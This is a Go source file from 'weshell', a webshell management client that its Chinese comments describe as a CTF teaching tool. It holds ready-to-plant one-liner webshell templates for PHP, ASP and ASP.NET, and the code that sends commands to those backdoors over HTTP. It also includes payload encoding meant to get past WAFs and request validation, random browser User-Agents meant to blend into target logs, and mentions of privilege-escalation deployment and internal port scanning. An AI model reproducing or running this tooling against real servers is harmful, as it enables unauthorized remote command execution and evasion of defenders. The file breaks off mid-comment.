// Package shell 实现 weshell 与靶机之间的明文 HTTP 通信与回显提取。
//
// 该包刻意保持「朴素」：请求就是一个带单个参数的表单或查询串，载荷是可读的
// 系统命令或一小段 PHP/JScript/VBScript 代码。没有加密、没有编码变形、没有混淆，
// 因此在教学中可以直接抓包观察真实流量。
//
// 连接类型（php-eval / php-cmd / asp / asp-vbs）的差异原先散落在每个能力函数里
// 以 `if o.Type == TypeAsp ...` 的形式判断。现在这些差异被收敛进 Shell 接口的各个
// 实现（见 php.go / asp.go），上层能力只调用接口方法，不再感知具体类型。
package shell

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"github.com/sirupsen/logrus"
	mrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// maxResponseSize 限制单次响应体积，避免靶机返回一个巨大输出把我们拖垮。
const maxResponseSize = 1 << 20 // 1 MiB

// maxRedirects 限制重定向次数。
const maxRedirects = 5

// maxDebugPayload 限制 debug 级日志中 payload 的最大打印长度，避免首次下发模块源码或
// fs.write 的大 base64 把日志刷爆；超出部分截断并标注总长度。
const maxDebugPayload = 4096

// truncateForLog 把 s 截断到不超过 n 字节；若发生截断，追加总长度说明（供 debug 日志用）。
func truncateForLog(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + fmt.Sprintf(" …[truncated, total %d bytes]", len(s))
}

// Logger 用于打印「发给靶机的请求」日志（与前端交互无关的、真正打到靶机的 HTTP 流量）。
// 默认使用 logrus 标准 logger；main 启动时会通过 SetLogger 替换为自定义格式（时间戳 + 级别，
// 无 [weshell] 前缀）的同一 logger，使这类日志与服务自身访问日志统一输出到 stdout。
var Logger logrus.FieldLogger = logrus.StandardLogger()

// SetLogger 设置包级日志器（传入 nil 视为不修改）。
func SetLogger(l logrus.FieldLogger) {
	if l != nil {
		Logger = l
	}
}

// 去 HTML 的工具正则，包级预编译避免重复构造。
var (
	reScript   = regexp.MustCompile(`(?is)<script[^>]*>.*?</script>`)
	reStyle    = regexp.MustCompile(`(?is)<style[^>]*>.*?</style>`)
	reTags     = regexp.MustCompile(`(?is)<[^>]+>`)
	reSpaces   = regexp.MustCompile(`[ \t]+`)
	reEntities = map[string]string{
		"&nbsp;": " ", "&lt;": "<", "&gt;": ">", "&amp;": "&", "&quot;": "\"", "&#39;": "'",
	}
)

// stripHTML 把靶机返回的错误页（通常是 HTML）清洗成可读纯文本：
// 去掉 script/style 与所有标签、解码常见实体、折叠多余空白。
// 靶机返回 500 时，响应体是一整页 ASP 错误页，直接透传会是一大坨 HTML，
// 剥离后只保留关键信息（如 "Microsoft VBScript compilation error '800a0401' ..."），
// 便于在前端错误区直接读出靶机报错原因。
func stripHTML(s string) string {
	s = reScript.ReplaceAllString(s, " ")
	s = reStyle.ReplaceAllString(s, " ")
	s = reTags.ReplaceAllString(s, " ")
	for from, to := range reEntities {
		s = strings.ReplaceAll(s, from, to)
	}
	s = reSpaces.ReplaceAllString(s, " ")
	// 折叠成多行文本：按原换行分段，每段再压缩多余空格。
	lines := strings.Split(s, "\n")
	for i, l := range lines {
		lines[i] = strings.TrimSpace(l)
	}
	out := strings.Join(lines, "\n")
	out = strings.TrimSpace(out)
	return out
}

// defaultUserAgent 是未指定 User-Agent 时使用的默认标识。
const defaultUserAgent = "weshell/ctf-teaching"

// userAgentPool 是「随机 User-Agent」模式从中抽取的常见浏览器 UA 池，
// 让靶机侧日志更接近正常浏览器流量。
var userAgentPool = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61",
}

// resolveUserAgent 根据配置决定实际发出的 User-Agent：
//   - 空串：使用默认标识 weshell/ctf-teaching
//   - "random"：每次随机选一个常见浏览器 UA
//   - 其他：原样作为固定 UA
func resolveUserAgent(cfg string) string {
	switch cfg {
	case "":
		return defaultUserAgent
	case "random":
		return userAgentPool[mrand.Intn(len(userAgentPool))]
	default:
		return cfg
	}
}

// 支持的连接类型。
const (
	// TypeEval 对应靶机侧 <?php @eval($_REQUEST['x']);?>，提交的是一小段 PHP 代码。
	TypeEval = "php-eval"
	// TypeCmd 对应靶机侧 <?php system($_REQUEST['x']);?> 等形态，直接提交系统命令。
	TypeCmd = "php-cmd"
	// TypeAsp 对应靶机侧 <%eval(""+Request("x"))%>，提交的是一小段 JScript 代码。
	// 经典 ASP（IIS）默认带 JScript 引擎，用 eval 注入代码即可跑命令、做结构化采集，
	// 与 PHP 的 eval 型能力对齐。命令执行走 WScript.Shell，结构化能力走 FSO / WMI / ADODB。
	TypeAsp = "asp"
	// TypeAspVbs 对应靶机侧 <%execute request("x")%>，提交的是一小段 VBScript 代码。
	// 经典菜刀一句话多用这种写法（VBScript 引擎）。能力上与 TypeAsp 对齐，
	// 只是提交给靶机的脚本语言不同：这里全部用 VBScript 拼装，JSON 输出靠内联的 JStr 辅助函数。
	TypeAspVbs = "asp-vbs"
	// TypeAspnet 对应靶机侧 shell_aspx_eval.aspx：用 CodeDom 把提交给靶机的 C# 代码片段在运行时
	// 编译进内存执行（C# 无内建 eval，这是等效写法）。既能跑系统命令，也能做文件/系统/进程/端口
	// 等结构化采集。仅适用于 IIS + .NET Framework（CodeDom 在 .NET Core 已移除）。
	TypeAspnet = "aspnet"
)

// SupportsStructured 判定该连接类型是否支持「结构化能力」（文件管理 / 监控 / 进程 / 端口 / 扫描），
// 即需要一个能提交代码、并夹随机标记截取回显的通道。php-eval / asp / asp-vbs / aspnet 均支持。
func SupportsStructured(t string) bool {
	switch t {
	case TypeEval, TypeAsp, TypeAspVbs, TypeAspnet:
		return true
	}
	return false
}

// SupportsLightOS 判定该连接类型是否支持轻量系统探测（/api/sysinfo/{id}/os）。
// 在 SupportsStructured 基础上，php-cmd 也能跑 uname/ver 判定系统，故一并纳入。
func SupportsLightOS(t string) bool {
	return SupportsStructured(t) || t == TypeCmd
}

// TypeInfo 描述一种连接类型，供前端下拉框与教学说明使用。
type TypeInfo struct {
	ID      string `json:"id"`
	Label   string `json:"label"`
	Snippet string `json:"snippet"` // 靶机侧样本模板，{param} 由前端替换
	Note    string `json:"note"`
}

// Types 返回全部支持的连接类型。
func Types() []TypeInfo {
	return []TypeInfo{
		{
			ID:      TypeEval,
			Label:   "PHP eval 型",
			Snippet: "<?php @eval($_REQUEST['{param}']);?>",
			Note:    "最常见的一句话。管理端提交一小段 PHP 代码，用随机标记包裹输出，回显定位最准确。",
		},
		{
			ID:      TypeCmd,
			Label:   "PHP 命令执行型",
			Snippet: "<?php system($_REQUEST['{param}']);?>",
			Note:    "直接把系统命令作为参数值提交。无法插入输出标记，回显为响应体原文。",
		},
		{
			ID:      TypeAsp,
			Label:   "ASP eval 型",
			Snippet: `<%eval(""+Request("{param}"))%>`,
			Note:    "经典 ASP（IIS）+ JScript 引擎。提交一段 JScript 代码，可执行系统命令、读写文件、采集系统/进程/端口信息，能力对齐 php-eval。命令执行依赖 WScript.Shell。",
		},
		{
			ID:      TypeAspVbs,
			Label:   "ASP execute 型",
			Snippet: `<%execute request("{param}")%>`,
			Note:    "经典菜刀一句话写法（VBScript 引擎）。提交一段 VBScript 代码，执行系统命令、读写文件、采集系统/进程/端口信息，能力对齐 asp。靶机侧用 <%execute request(\"x\")%> 即可，参数名与这里一致。",
		},
		{
			ID:      TypeAspnet,
			Label:   "ASP.NET eval 型",
			Snippet: `<%@ Page Language="C#" ValidateRequest="false" %><%@ Import Namespace="System.CodeDom.Compiler" %><%@ Import Namespace="Microsoft.CSharp" %><% var __raw=Request.Unvalidated["{param}"]; if(!string.IsNullOrEmpty(__raw)){string src=System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(__raw)); var cp=new CompilerParameters();cp.GenerateInMemory=true;cp.ReferencedAssemblies.Add("System.dll");cp.ReferencedAssemblies.Add("System.Web.dll");cp.ReferencedAssemblies.Add("System.Management.dll");cp.ReferencedAssemblies.Add("System.Data.dll");using(var p=new CSharpCodeProvider()){var r=p.CompileAssemblyFromSource(cp,src);if(r.Errors.HasErrors){foreach(CompilerError e in r.Errors)Response.Write("[CompileError] "+e.ToString());}else{r.CompiledAssembly.GetType("WshRunner").GetMethod("Run").Invoke(null,null);}}}%>`,
			Note:    "经典 ASP.NET（IIS + .NET Framework）。C# 无内建 eval，用 CodeDom 把提交的 C# 代码在运行时编译执行（等效 eval）：可执行命令、读写文件、采集系统/进程/端口信息。靶机侧用 shell_aspx_eval.aspx（参数名 {param}）。仅 .NET Framework 可用，.NET Core 已移除 CodeDom。",
		},
	}
}

// Valid 判断连接类型是否受支持。
func Valid(t string) bool {
	switch t {
	case TypeEval, TypeCmd, TypeAsp, TypeAspVbs, TypeAspnet:
		return true
	default:
		return false
	}
}

// ExecOptions 描述一次命令执行所需的全部参数。
type ExecOptions struct {
	TargetURL  string
	Param      string
	Method     string // GET / POST
	Type       string // TypeEval / TypeCmd / TypeAsp
	Command    string
	Timeout    time.Duration
	SkipVerify bool   // 是否忽略靶机 HTTPS 证书校验
	Proxy      string // 可选，访问靶机的 HTTP 代理（http/https/socks5），留空则走环境代理
	UserAgent  string // 可选，自定义 User-Agent；"random" 表示每次随机；留空用默认 UA
	Encoding   string // 载荷编码方式：空/none(原样)、base64、hex、xor；用于绕过 WAF / ASP.NET 请求验证
	EncodingKey string // xor 编码密钥（仅 xor 方式需要）
	Jar        http.CookieJar `json:"-"` // 可选，会话模块机制所需的 cookie 罐（跨请求保持靶机会话），按靶标 ID 隔离
}

// resolveEncoding 计算实际应用的编码：用户显式指定则用之；未指定时一律原样发送（不编码）。
// 说明：aspnet 曾默认 base64 以兼容“默认开启请求验证”的 IIS，但本项目自带 aspx 已
// ValidateRequest=false，且 base64 解码失败会回退用原文；加之每请求下发的 WshRunner 骨架 +
// 极短 modCall 载荷本身不含 < > & 等会触发请求验证的字符，故 aspnet 不再默认 base64，
// 直接发明文源码即可。确需绕过 WAF / 请求验证时，仍可在靶机上显式指定 base64 / hex / xor。
func resolveEncoding(o ExecOptions) string {
	e := strings.ToLower(strings.TrimSpace(o.Encoding))
	if e == "none" {
		return ""
	}
	return e
}

// applyEncoding 按指定方式对明文载荷做传输编码。
//   - 空/none：原样返回
//   - base64：标准 base64（不含 < > &，可绕过 ASP.NET 请求验证）
//   - hex：十六进制（同样不含危险字符）
//   - xor：与密钥逐字节异或，需 EncodingKey；输出可能含任意字节，由表单层 URL 编码安全传输
func applyEncoding(raw, enc, key string) (string, error) {
	switch strings.ToLower(enc) {
	case "", "none":
		return raw, nil
	case "base64":
		return base64.StdEncoding.EncodeToString([]byte(raw)), nil
	case "hex":
		return hex.EncodeToString([]byte(raw)), nil
	case "xor":
		if key == "" {
			return "", errors.New("xor 编码需要密钥(encodingKey)")
		}
		return xorEncode(raw, key), nil
	default:
		return "", fmt.Errorf("不支持的编码方式: %q", enc)
	}
}

// xorEncode 用密钥对明文逐字节异或。
func xorEncode(s, key string) string {
	kb := []byte(key)
	b := []byte(s)
	out := make([]byte, len(b))
	for i := range b {
		out[i] = b[i] ^ kb[i%len(kb)]
	}
	return string(out)
}

// Result 是一次命令执行的完整结果。RequestURL 与 Payload 供教学时观察实际请求形态。
type Result struct {
	OK         bool   `json:"ok"`
	Output     string `json:"output"`
	Status     int    `json:"status"`
	LatencyMS  int64  `json:"latencyMs"`
	Error      string `json:"error,omitempty"`
	RequestURL string `json:"requestUrl"`
	Payload    string `json:"payload"`
	Truncated  bool   `json:"truncated"`
	// DeployedPath 是 PrivEsc 自动部署后靶机上的真实落盘路径（文件名取内嵌字节的 MD5，
	// 形如 C:\Windows\Temp\<md5>.exe）。仅提权流程会填充；普通命令执行恒为空。
	// 前端用它覆盖「运行结果」里那行客户端预览命令，避免显示成用户填写的 GodPotato.exe。
	DeployedPath string `json:"deployedPath,omitempty"`
}

// InspectResult 是一次探测请求的完整报文信息，供教学时观察管理端与靶机之间的真实流量。
// RequestHeaders 为管理端实际构造并发往靶机的请求头，ResponseHeaders 为靶机返回的响应头。
type InspectResult struct {
	OK              bool                `json:"ok"`
	Status          int                 `json:"status"`
	LatencyMS       int64               `json:"latencyMs"`
	Error           string              `json:"error,omitempty"`
	RequestURL      string              `json:"requestUrl"`
	Payload         string              `json:"payload"`
	RequestHeaders  map[string][]string `json:"requestHeaders"`
	ResponseHeaders map[string][]string `json:"responseHeaders"`
}

// inspectMark 是报文探查使用的探测回显标记。
const inspectMark = "__weshell_inspect__"

// Shell 抽象一种靶机连接类型（php-eval / php-cmd / asp / asp-vbs）。
//
// 原先每个能力函数里都写满 `if o.Type == TypeAsp || o.Type == TypeAspVbs { ... } else { PHP 分支 }`
// 的 switch，且 ASP 内部还要在 JScript / VBScript 两套模板间再选一次。现在把"如何把一次能力
// 翻译成靶机代码"下放到每个 Shell 实现里，上层能力只调用接口方法，不再感知具体类型。
type Shell interface {
	// Type 返回该连接类型 ID（TypeEval / TypeCmd / TypeAsp / TypeAspVbs）。
	Type() string

	// Run 在靶机上执行一条系统命令，返回回显结果。
	Run(ctx context.Context, o ExecOptions, cmd string) Result

	// Code 提交一段（eval 型）代码到靶机，用于文件管理等结构化能力。
	// 不支持代码执行时（如 php-cmd）返回带错误的 Result。
	Code(ctx context.Context, o ExecOptions, code string) Result

	// Probe 返回 Inspect 探测时提交的"空操作"载荷：
	//   - php 类：原探测串（无害裸字符串）；
	//   - asp（JScript）：`//` 注释；
	//   - asp-vbs（VBScript）：`Rem` 注释（实测 `execute "0"` 反而 500）。
	Probe() string

	// wrap 把一段靶机代码包上引擎相关的标记包裹，返回 (payload, start, end)。
	// 各引擎只负责"如何夹标记"，helpers 由调用方按需拼进 code（见 Code）。
	wrap(code string) (string, string, string)
	// bootstrap 返回会话模块机制的基础代码（store/mod/clear 及共享助手），
	// 每次请求都随载荷发送（恒定、体积小）；模块源码本身只在首次存入靶机会话。
	bootstrap() string
	// modCall 返回调用某模块的短指令（模块源码已缓存在靶机会话中）。
	// 第二个参数是 encodeArgs 产出的「参数表达式」：php 为 array(...) 字面量；
	// asp 的 JScript 方言与 asp.net 为 \x1e/\x1f 打包串；asp 的 VBScript 方言为构造
	// Scripting.Dictionary 的源码（定义页面级变量 wadict，由 wsh_mod 经 Execute 递进模块 Sub 形参）。
	modCall(name, argexpr string) string
	// encodeArgs 把参数字典编码成靶机源码里的参数表达式：
	// php 产出 array('k'=>'v',...)（真字典，无 \x1f 污染）；asp 的 JScript 方言与
	// asp.net 产出 \x1e/\x1f 打包串；asp 的 VBScript 方言产出构造 Scripting.Dictionary
	// 的源码（字典对象直递模块 Sub，无打包串、无 Session 参数信箱）。
	encodeArgs(args map[string]any) string
	// modStore 返回把模块源码存入靶机会话的指令（src 为原始（未编码）源码；
	// 编码方式由各靶机类型决定：php/asp 靶机经 base64 注入，asp.net 直接内联 C# 字符串字面量）。
	modStore(name, src string) string
	// clearCall 返回清空靶机会话中全部模块缓存的指令。
	clearCall() string
	// bootInstall 返回把机件函数（store/mod/clear 等）一次性写入靶机会话的指令，
	// 供首次接触或会话失效后自愈；无需每次随载荷发送（已由极短的重水合前缀取代）。
	bootInstall() string

	// 结构化能力：返回靶机代码与可能的错误；不支持时返回错误。
	// 这些方法的职责只是"产出要提交的代码字符串"（已转义、已替换占位符），
	// 实际的 HTTP 传输由 Run / Code 负责。
	// PortScan 对目标主机做 TCP 端口扫描，返回扫描用代码与可能的错误；不支持时返回错误。
	// host 为目标地址，ports 为已展开的逗号分隔端口列表（由 ExpandPorts 预先处理）。
	PortScan(host string, ports string) (string, error)
	// HostScan 对内网多台目标主机做 TCP 端口扫描，返回扫描用代码与可能的错误；不支持时返回错误。
	// hosts 为竖线分隔、已展开的主机列表；ports 为已展开的逗号分隔端口列表；
	// probe 为逗号分隔的存活探测端口（由调用方提供，见 ScanProbePorts）。
	HostScan(hosts string, ports string, probe string) (string, error)
}

// ForType 按连接类型返回对应的 Shell 实现。无效类型由调用方先用 Valid 校验，
// 这里兜底返回 php-eval（其所有能力方法都会正确报错）。
func ForType(t string) Shell {
	switch t {
	case TypeEval:
		return phpShell{eval: true}
	case TypeCmd:
		return phpShell{eval: false}
	case TypeAsp:
		return newAspJS()
	case TypeAspVbs:
		return newAspVBS()
	case TypeAspnet:
		return newAspnet()
	default:
		return phpShell{eval: true}
	}
}

// Execute 向靶标发送一次命令并返回回显。
// 所有失败都以 Result.OK=false + Error 体现，不返回 error，便于前端统一渲染。
func Execute(ctx context.Context, o ExecOptions) Result {
	if err := o.validate(); err != nil {
		return Result{Error: err.Error()}
	}
	if strings.TrimSpace(o.Command) == "" {
		return Result{Error: "命令不能为空"}
	}
	return ForType(o.Type).Run(ctx, o, o.Command)
}

// ExecutePHP 提交一段 PHP 代码到靶机执行（仅 php-eval 类型）。
// 代码输出被随机标记包裹，便于从响应中精确截取，适用于文件管理等需要结构化返回的场景。
func ExecutePHP(ctx context.Context, o ExecOptions, phpCode string) Result {
	if err := o.validate(); err != nil {
		return Result{Error: err.Error()}
	}
	if o.Type != TypeEval {
		return Result{Error: "文件管理仅支持 php-eval 类型靶机"}
	}
	return ForType(o.Type).Code(ctx, o, phpCode)
}

// ExecuteASP 提交一段 JScript/VBScript 代码到 ASP 靶机执行（仅 asp / asp-vbs 类型）。
// 与 ExecutePHP 类似：代码输出被随机标记包裹，便于从响应中精确截取结构化回显。
// 代码本身应通过 Response.Write 输出内容，外层再补 start/end 标记。
func ExecuteASP(ctx context.Context, o ExecOptions, aspCode string) Result {
	if err := o.validate(); err != nil {
		return Result{Error: err.Error()}
	}
	if o.Type != TypeAsp && o.Type != TypeAspVbs && o.Type != TypeAspnet {
		return Result{Error: "该操作仅支持 asp / asp-vbs / aspnet 类型靶机"}
	}
	return ForType(o.Type).Code(ctx, o, aspCode)
}

// send 是 Execute / Code 共用的底层发送逻辑：构造请求、发给靶机、截取标记之间的回显。
func send(ctx context.Context, o ExecOptions, payload, start, end string) Result {
	method := strings.ToUpper(o.Method)
	u, err := url.Parse(o.TargetURL)
	if err != nil {
		return Result{Error: fmt.Sprintf("URL 解析失败: %v", err)}
	}
	form := url.Values{}
	enc := resolveEncoding(o)
	val, err := applyEncoding(payload, enc, o.EncodingKey)
	if err != nil {
		return Result{Error: err.Error(), Payload: payload, RequestURL: o.TargetURL}
	}
	form.Set(o.Param, val)
	// 仅当用户显式指定编码时才附带 enc/key 提示，靶机据此解码；
	// aspnet 的 base64 兜底不发送 enc，依赖靶机默认按 base64 解码。
	if o.Encoding != "" {
		form.Set("enc", strings.ToLower(o.Encoding))
		if strings.EqualFold(o.Encoding, "xor") && o.EncodingKey != "" {
			form.Set("key", o.EncodingKey)
		}
	}

	var body io.Reader
	displayURL := o.TargetURL
	var reqBytes int
	switch method {
	case http.MethodGet:
		// 保留靶标 URL 上原有的查询串，再追加我们的参数。
		q := u.Query()
		for k, vs := range form {
			q[k] = vs
		}
		u.RawQuery = q.Encode()
		displayURL = u.String()
		reqBytes = len(u.RawQuery)
	default:
		body = strings.NewReader(form.Encode())
		reqBytes = len(form.Encode())
	}

	if o.Timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, o.Timeout)
		defer cancel()
	}

	req, err := http.NewRequestWithContext(ctx, method, u.String(), body)
	if err != nil {
		return Result{Error: fmt.Sprintf("构造请求失败: %v", err)}
	}
	if method == http.MethodPost {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	req.Header.Set("User-Agent", resolveUserAgent(o.UserAgent))

	begin := time.Now()
	client, err := o.httpClient()
	if err != nil {
		return Result{
			Error:      fmt.Sprintf("构造客户端失败: %v", err),
			LatencyMS:  time.Since(begin).Milliseconds(),
			RequestURL: displayURL,
			Payload:    payload,
		}
	}

	encName := enc
	if encName == "" {
		encName = "none"
	}
	Logger.Debugf("webshell payload target=%s param=%s enc=%s bytes=%d:\n%s",
		displayURL, o.Param, encName, len(payload), truncateForLog(payload, maxDebugPayload))

	resp, err := client.Do(req)
	if err != nil {
		Logger.Infof("request failed %s %s param=%d err=%v", method, displayURL, reqBytes, err)
		return Result{
			Error:      fmt.Sprintf("请求失败: %v", err),
			LatencyMS:  time.Since(begin).Milliseconds(),
			RequestURL: displayURL,
			Payload:    payload,
		}
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(io.LimitReader(resp.Body, maxResponseSize))
	latency := time.Since(begin).Milliseconds()
	if err != nil {
		Logger.Infof("request read failed %s %s param=%d err=%v", method, displayURL, reqBytes, err)
		return Result{
			Error:      fmt.Sprintf("读取响应失败: %v", err),
			Status:     resp.StatusCode,
			LatencyMS:  latency,
			RequestURL: displayURL,
			Payload:    payload,
		}
	}
	Logger.Infof("%s %s param=%d resp=%d %d %dms",
		method, displayURL, reqBytes, len(raw), resp.StatusCode, latency)
	if err != nil {
		return Result{
			Error:      fmt.Sprintf("读取响应失败: %v", err),
			Status:     resp.StatusCode,
			LatencyMS:  latency,
			RequestURL: displayURL,
			Payload:    payload,
		}
	}

	out := string(raw)
	truncated := len(raw) >= maxResponseSize
	if start != "" && end != "" {
		if extracted, ok := extract(out, start, end); ok {
			out = extracted
		}
	}

	res := Result{
		OK:         true,
		Output:     strings.Trim(out, "\r\n"),
		Status:     resp.StatusCode,
		LatencyMS:  latency,
		RequestURL: displayURL,
		Payload:    payload,
		Truncated:  truncated,
	}
	if resp.StatusCode >= 400 {
		res.OK = false
		body := strings.TrimSpace(out)
		if body == "" {
			// 响应体为空通常是靶机 display_errors=Off，把真实致命错误吞掉了。
			// weshell 看不到原因，只能提示用户去靶机侧开 display_errors 或查错误日志。
			res.Error = fmt.Sprintf("靶机返回 HTTP %d（响应体为空，未透出错误；"+
				"请到靶机侧开启 display_errors 或查看 PHP 错误日志定位致命错误）", resp.StatusCode)
		} else {
			// 靶机报错时响应通常是一整页 HTML 错误页，剥离标签后塞进 error，
			// 让前端能力页 / 命令执行能直接展示靶机的真实报错原因。
			text := stripHTML(body)
			if text == "" {
				text = body // 全是标签则退回原始文本
			}
			if runes := []rune(text); len(runes) > 2000 {
				text = string(runes[:2000]) + "\n…(响应已截断，更多内容见请求/响应详情)"
			}
			res.Error = fmt.Sprintf("靶机返回 HTTP %d：%s", resp.StatusCode, text)
		}
	}
	return res
}

// Inspect 向靶标发一次探测请求，返回管理端实际构造的请求头与靶机返回的响应头，
// 用于教学时观察两端之间的真实 HTTP 流量。它对四种连接类型通用（只是一次普通 HTTP 请求）。
// 即便靶机不可达，也会尽量返回已构造好的请求头，便于排查「发出去的是什么」。
func Inspect(ctx context.Context, o ExecOptions) InspectResult {
	if err := o.validate(); err != nil {
		return InspectResult{Error: err.Error()}
	}
	method := strings.ToUpper(o.Method)
	u, err := url.Parse(o.TargetURL)
	if err != nil {
		return InspectResult{Error: fmt.Sprintf("URL 解析失败: %v", err)}
	}
	form := url.Values{}
	p := ForType(o.Type).Probe()
	encP, err := applyEncoding(p, resolveEncoding(o), o.EncodingKey)
	if err != nil {
		return InspectResult{Error: err.Error(), RequestURL: o.TargetURL}
	}
	form.Set(o.Param, encP)
	if o.Encoding != "" {
		form.Set("enc", strings.ToLower(o.Encoding))
		if strings.EqualFold(o.Encoding, "xor") && o.EncodingKey != "" {
			form.Set("key", o.EncodingKey)
		}
	}

	var body io.Reader
	displayURL := o.TargetURL
	switch method {
	case http.MethodGet:
		q := u.Query()
		for k, vs := range form {
			q[k] = vs
		}
		u.RawQuery = q.Encode()
		displayURL = u.String()
	default:
		body = strings.NewReader(form.Encode())
	}

	if o.Timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, o.Timeout)
		defer cancel()
	}

	req, err := http.NewRequestWithContext(ctx, method, u.String(), body)
	if err != nil {
		return InspectResult{Error: fmt.Sprintf("构造请求失败: %v", err)}
	}
	if method == http.MethodPost {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	req.Header.Set("User-Agent", resolveUserAgent(o.UserAgent))

	begin := time.Now()
	client, err := o.httpClient()
	if err != nil {
		return InspectResult{
			Error:          fmt.Sprintf("构造客户端失败: %v", err),
			LatencyMS:      time.Since(begin).Milliseconds(),
			RequestURL:     displayURL,
			RequestHeaders: req.Header,
		}
	}

	resp, err := client.Do(req)
	latency := time.Since(begin).Milliseconds()
	if err != nil {
		return InspectResult{
			OK:             false,
			Error:          fmt.Sprintf("请求失败: %v", err),
			LatencyMS:      latency,
			RequestURL:     displayURL,
			Payload:        p,
			RequestHeaders: req.Header,
		}
	}
	defer resp.Body.Close()
	// 丢弃响应体：本接口只关心报文头，不解析回显。
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, maxResponseSize))

	res := InspectResult{
		OK:              true,
		Status:          resp.StatusCode,
		LatencyMS:       latency,
		RequestURL:      displayURL,
		Payload:         p,
		RequestHeaders:  req.Header,
		ResponseHeaders: resp.Header,
	}
	if resp.StatusCode >= 400 {
		res.OK = false
		res.Error = fmt.Sprintf("靶机返回 HTTP %d", resp.StatusCode)
	}
	return res
}

// validate 校验一次执行请求的必要字段。
func (o ExecOptions) validate() error {
	if strings.TrimSpace(o.TargetURL) == "" {
		return fmt.Errorf("靶标 URL 不能为空")
	}
	u, err := url.Parse(o.TargetURL)
	if err != nil {
		return fmt.Errorf("靶标 URL 无法解析: %w", err)
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return fmt.Errorf("靶标 URL 必须是 http 或 https，当前为 %q", u.Scheme)
	}
	if u.Host == "" {
		return fmt.Errorf("靶标 URL 缺少主机名")
	}
	if strings.TrimSpace(o.Param) == "" {
		return fmt.Errorf("连接参数名不能为空")
	}
	if !Valid(o.Type) {
		return fmt.Errorf("不支持的连接类型: %q", o.Type)
	}
	switch strings.ToUpper(o.Method) {
	case http.MethodGet, http.MethodPost:
	default:
		return fmt.Errorf("不支持的 HTTP 方法: %q，仅支持 GET / POST", o.Method)
	}
	if o.Proxy != "" {
		if _, err := ProxyURL(o.Proxy); err != nil {
			return err
		}
	}
	return nil
}

// ProxyURL 校验并解析代理地址，仅允许 http/https/socks5 三种 scheme。
func ProxyURL(raw string) (*url.URL, error) {
	pu, err := url.Parse(raw)
	if err != nil {
		return nil, fmt.Errorf("代理地址无法解析: %w", err)
	}
	switch pu.Scheme {
	case "http", "https", "socks5", "socks5h":
	default:
		return nil, fmt.Errorf("代理地址 scheme 必须为 http/https/socks5，当前为 %q", pu.Scheme)
	}
	if pu.Host == "" {
		return nil, fmt.Errorf("代理地址缺少主机名: %q", raw)
	}
	return pu, nil
}

// WithCommand 返回一份带命令字段的 ExecOptions 副本，便于在共用基础配置上拼装探测命令。
func (o ExecOptions) WithCommand(cmd string) ExecOptions {
	o.Command = cmd
	return o
}

// httpClient 构造本次执行使用的 HTTP 客户端：默认读取环境代理（HTTP_PROXY 等），
// 若显式配置了 Proxy 则以其为准；SkipVerify 为真时跳过靶机 TLS 证书校验。
func (o ExecOptions) httpClient() (*http.Client, error) {
	transport := &http.Transport{
		Proxy: http.ProxyFromEnvironment,
	}
	if o.Proxy != "" {
		pu, err := ProxyURL(o.Proxy)
		if err != nil {
			return nil, err
		}
		transport.Proxy = http.ProxyURL(pu)
	}
	if o.SkipVerify {
		transport.TLSClientConfig = insecureTLSConfig()
	}
	return &http.Client{
		Transport: transport,
		Timeout:   o.Timeout,
		Jar:       o.Jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= maxRedirects {
				return fmt.Errorf("重定向次数超过 %d 次，已中止", maxRedirects)
			}
			return nil
		},
	}, nil
}

// insecureTLSConfig 仅供用户显式传入 -insecure 时使用。
func insecureTLSConfig() *tls.Config {
	return &tls.Config{InsecureSkipVerify: true}
}

// marker 生成一次性的随机标记，避免与命令输出内容撞车。
func marker() string {
	var buf [8]byte
	if _, err := rand.Read(buf[:]); err != nil {
		return fmt.Sprintf("ws-%d", time.Now().UnixNano())
	}
	return "ws-" + hex.EncodeToString(buf[:])
}

// extract 截取 start 与 end 两个标记之间的内容。
func extract(body, start, end string) (string, bool) {
	i := strings.Index(body, start)
	if i < 0 {
		return "", false
	}
	rest := body[i+len(start):]
	j := strings.Index(rest, end)
	if j < 0 {
		// 命令可能执行到一半被超时掐断，返回已拿到的部分比什么都不给更有用。
		return rest, true
	}
	return rest[:j], true
}

// withStderr 给命令追加 2>&1，让标准错误也进入回显，方便教学排错。
func withStderr(cmd string) string {
	if strings.Contains(cmd, "2>") {
		return cmd
	}
	return cmd + " 2>&1"
}

// phpQuote 生成 PHP 单引号字符串字面量。PHP 单引号串内只有 \ 和 ' 需要转义。
func phpQuote(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `'`, `\'`)
	return "'" + s + "'"
}

// jsStr 生成 JScript 双引号字符串字面量：转义反斜杠、双引号与换行。
// 用于把命令 / 路径等参数安全地嵌入提交给 ASP 靶机的 JScript 代码里。
